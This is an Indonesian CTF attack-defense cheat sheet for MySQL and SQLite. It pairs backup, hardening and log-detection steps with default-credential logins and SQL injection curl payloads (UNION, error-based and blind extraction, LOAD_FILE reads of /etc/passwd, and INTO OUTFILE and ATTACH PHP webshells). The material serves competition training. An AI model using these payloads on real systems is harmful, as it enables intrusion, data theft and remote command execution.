# 🗄️ MySQL/MariaDB/SQLite Defense & Attack Bible — CTF A/D

> **Kamus Lengkap Database: Defense (Amankan DB Sendiri) + Offense (Curi Flag dari DB Lawan)**

---

## 1. 🔌 KONEKSI & RECON DATABASE

```bash
# Login MySQL (coba semua kemungkinan)
mysql -u root                          # Tanpa password (sering default di CTF!)
mysql -u root -p                       # Dengan password
mysql -u root -proot                   # Password = root
mysql -u root -ptoor                   # Password = toor
mysql -u admin -padmin                 # User admin
mysql -u ctf -pctf                     # User ctf

# Quick Recon Setelah Login
SHOW DATABASES;
USE nama_database;
SHOW TABLES;
DESCRIBE nama_tabel;
SELECT * FROM nama_tabel LIMIT 10;

# Lihat semua user & privilege
SELECT User, Host, authentication_string FROM mysql.user;
SHOW GRANTS FOR CURRENT_USER();
SHOW GRANTS FOR 'root'@'localhost';

# Lihat proses aktif
SHOW PROCESSLIST;
SHOW FULL PROCESSLIST;

# Lihat variabel penting
SHOW VARIABLES LIKE 'secure_file_priv';   -- Apakah LOAD_FILE aktif?
SHOW VARIABLES LIKE 'local_infile';       -- Apakah LOAD DATA LOCAL aktif?
SHOW VARIABLES LIKE 'general_log%';       -- Apakah query logging aktif?
```

---

## 2. 💾 BACKUP DATABASE DARURAT (WAJIB MENIT PERTAMA!)

```bash
# Full backup semua database
mysqldump -u root --all-databases > /tmp/full_backup.sql

# Backup database spesifik
mysqldump -u root nama_database > /tmp/db_backup.sql

# Backup aman (dengan routines, triggers, single-transaction)
mysqldump -u root --single-transaction --routines --triggers nama_database > /tmp/safe_backup.sql

# Backup hanya tabel tertentu
mysqldump -u root nama_database tabel_flags tabel_users > /tmp/tables_backup.sql

# RESTORE dari backup (jika attacker merusak data)
mysql -u root nama_database < /tmp/db_backup.sql

# SQLite backup
cp /path/to/db.sqlite /tmp/db_backup_$(date +%H%M%S).sqlite
sqlite3 /path/to/db.sqlite ".dump" > /tmp/sqlite_dump.sql
```

---

## 3. 🔒 HARDENING MYSQL (Amankan Dari Attacker!)

```sql
-- 1. GANTI PASSWORD ROOT (WAJIB!)
ALTER USER 'root'@'localhost' IDENTIFIED BY 'N3wCTFStr0ng!';
FLUSH PRIVILEGES;

-- 2. Ganti password web application user
ALTER USER 'web_user'@'localhost' IDENTIFIED BY 'W3bUs3rStr0ng!';
FLUSH PRIVILEGES;

-- 3. Cabut privilege berbahaya dari web user
REVOKE FILE ON *.* FROM 'web_user'@'localhost';       -- Blokir LOAD_FILE
REVOKE PROCESS ON *.* FROM 'web_user'@'localhost';    -- Blokir SHOW PROCESSLIST
REVOKE SUPER ON *.* FROM 'web_user'@'localhost';      -- Blokir admin commands
REVOKE CREATE ON *.* FROM 'web_user'@'localhost';     -- Blokir buat tabel baru
REVOKE DROP ON *.* FROM 'web_user'@'localhost';       -- Blokir hapus tabel
REVOKE ALTER ON *.* FROM 'web_user'@'localhost';      -- Blokir alter tabel
FLUSH PRIVILEGES;

-- 4. Matikan LOAD_FILE & OUTFILE (Anti file read/write via SQLi)
SET GLOBAL local_infile = 0;

-- 5. Cek UDF (User Defined Functions) jahat
SELECT * FROM mysql.func;
-- Jika ada yang mencurigakan: DROP FUNCTION nama_fungsi;

-- 6. Cek dan hapus user mencurigakan (bukan bawaan)
SELECT User, Host FROM mysql.user;
-- DROP USER 'hacker'@'%';

-- 7. Cek trigger jahat (attacker bisa tanam trigger!)
SHOW TRIGGERS;
-- DROP TRIGGER IF EXISTS nama_trigger;

-- 8. Cek stored procedure jahat
SHOW PROCEDURE STATUS WHERE Db = 'nama_database';
-- DROP PROCEDURE IF EXISTS nama_procedure;

-- 9. Cek event scheduler
SHOW EVENTS;
-- DROP EVENT IF EXISTS nama_event;
```

---

## 4. 🚩 MENCARI FLAG DI DATABASE

```sql
-- Cari tabel yang mengandung kata "flag"
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables
WHERE TABLE_NAME LIKE '%flag%' OR TABLE_NAME LIKE '%token%' OR TABLE_NAME LIKE '%secret%';

-- Cari kolom yang mengandung kata "flag"
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns
WHERE COLUMN_NAME LIKE '%flag%' OR COLUMN_NAME LIKE '%token%' OR COLUMN_NAME LIKE '%secret%';

-- Baca isi tabel flag (setelah tahu nama tabel)
SELECT * FROM flags;
SELECT * FROM flag;
SELECT * FROM secrets;
SELECT * FROM tokens;

-- Bruteforce: loop semua tabel, cari string "FLAG{"
-- (Jalankan di bash)
```

```bash
# Bash script: cari flag di SEMUA tabel database
DB="nama_database"
for TABLE in $(mysql -u root -N -e "SHOW TABLES" $DB); do
    RESULT=$(mysql -u root -N -e "SELECT * FROM $TABLE" $DB 2>/dev/null | grep -oP '(FLAG|JCSC|CTF|CYBER)\{[^}]+\}')
    if [ -n "$RESULT" ]; then
        echo "[FLAG FOUND] Table: $TABLE -> $RESULT"
    fi
done
```

---

## 5. ⚔️ SQL INJECTION CHEAT SHEET (Untuk Menyerang Lawan)

### 5.1 Deteksi Jumlah Kolom
```
# ORDER BY method
?id=1 ORDER BY 1--       (OK)
?id=1 ORDER BY 2--       (OK)
?id=1 ORDER BY 3--       (OK)
?id=1 ORDER BY 4--       (ERROR -> Berarti ada 3 kolom)

# UNION NULL method
?id=1 UNION SELECT NULL--
?id=1 UNION SELECT NULL,NULL--
?id=1 UNION SELECT NULL,NULL,NULL--     (OK -> 3 kolom)
```

### 5.2 UNION-Based SQLi
```bash
# Extrak database name
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,database(),3-- -"

# Extrak semua tabel
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"

# Extrak kolom dari tabel 'flags'
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='flags'-- -"

# BACA FLAG!
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,flag,3 FROM flags-- -"
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,GROUP_CONCAT(flag),3 FROM flags-- -"
```

### 5.3 Error-Based SQLi
```bash
# ExtractValue
curl "http://TARGET/vuln.php?id=1' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)))-- -"

# UpdateXML
curl "http://TARGET/vuln.php?id=1' AND updatexml(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)),1)-- -"
```

### 5.4 Boolean Blind SQLi
```bash
# Cek karakter pertama flag
curl "http://TARGET/vuln.php?id=1' AND (SELECT SUBSTRING(flag,1,1) FROM flags LIMIT 1)='F'-- -"
curl "http://TARGET/vuln.php?id=1' AND (SELECT SUBSTRING(flag,1,4) FROM flags LIMIT 1)='FLAG'-- -"
```

### 5.5 Time-Based Blind SQLi
```bash
# Jika response delay 2 detik = TRUE
curl "http://TARGET/vuln.php?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM flags)='F',SLEEP(2),0)-- -"
```

### 5.6 File Read via SQLi (LOAD_FILE)
```bash
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,LOAD_FILE('/flag'),3-- -"
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,LOAD_FILE('/flag.txt'),3-- -"
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
```

### 5.7 Write Webshell via SQLi (INTO OUTFILE)
```bash
# Tulis webshell ke server lawan (JIKA secure_file_priv kosong)
curl "http://TARGET/vuln.php?id=0 UNION SELECT 1,'<?php system(\$_GET[\"c\"]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'-- -"

# Kemudian akses webshell:
curl "http://TARGET/cmd.php?c=cat+/flag"
```

---

## 6. 📱 SQLite Cheat Sheet (Flask / Python CTF)

```bash
# Buka database SQLite
sqlite3 /path/to/db.sqlite

# Recon
.databases
.tables
.schema nama_tabel
SELECT * FROM sqlite_master;

# Cari flag
SELECT * FROM flags;
SELECT * FROM users;
SELECT * FROM secrets;

# Dump semua data
.dump

# SQLite injection via ATTACH (tulis webshell!)
# Payload: '; ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.x(y TEXT); INSERT INTO pwn.x VALUES('<?php system($_GET["c"]);?>');--
```

---

## 7. 🛡️ DETEKSI SERANGAN DATABASE DARI LOG

```sql
-- Aktifkan general query log (lihat semua query masuk)
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/tmp/mysql_queries.log';

-- Monitor query log
-- (Di terminal bash:)
-- tail -f /tmp/mysql_queries.log | grep -iE 'union|select.*from|load_file|into outfile|sleep|benchmark'
```
